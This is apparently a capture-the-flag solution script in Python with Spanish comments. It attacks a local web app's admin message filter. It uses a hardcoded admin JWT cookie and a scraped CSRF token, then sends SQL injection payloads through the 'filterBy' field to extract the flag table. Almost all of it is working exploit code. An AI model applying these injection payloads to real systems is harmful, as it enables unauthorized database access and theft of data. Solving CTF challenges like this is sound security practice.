import requests
from bs4 import BeautifulSoup
import re

session = requests.Session()
session.cookies.set("token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Miwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzU5NjkwNzY3LCJleHAiOjE3NTk2OTQzNjd9.H8S75FG3KnD_lyMXm0fnCnMW-KIWeLvQnbibNse4tCU")
# Paso 1: Obtener CSRF
r = session.get("http://localhost:3000/admin/msgs")
soup = BeautifulSoup(r.text, "html.parser")
csrf = soup.find("input", {"name": "_csrf"})["value"]

# Paso 2: Construir payload en 'keyword'
# Esto cierra la comilla del LIKE y agrega un OR para seleccionar la flag
# filter_payload = 'type" LIKE \'%\' UNION SELECT msgs.id, flags.flag, \'general\', msgs.createdAt, \'admin\' FROM msgs JOIN flags ON TRUE --'
filter_payload = 'type" = \'general\' UNION ALL WITH msgs AS (SELECT id, flag as msg, \'general\' as type, CURRENT_TIMESTAMP as createdAt, \'admin\' as username FROM flags) SELECT * FROM msgs WHERE "type'
# filter_payload = 'msg" LIKE \'%\' UNION SELECT flags.id AS id, flags.flag AS msg, \'general\' AS type, CURRENT_TIMESTAMP AS createdAt, \'admin\' AS username FROM flags WHERE "id::text'

data = {
    "_csrf": csrf,
    "filterBy": filter_payload,
    "keyword": "%"
}

print("[*] Enviando payload en 'filterBy':", filter_payload)
r2 = session.post("http://localhost:3000/admin/msgs", data=data)
html = r2.text

# Paso 3: Buscar la flag en la respuesta
m = re.search(r"(Securinets\{[^}]+\})", html)
if m:
    print("FLAG encontrada:", m.group(1))
else:
    print("No se encontró la flag. Fragmento HTML:")
    print(html[:2000])
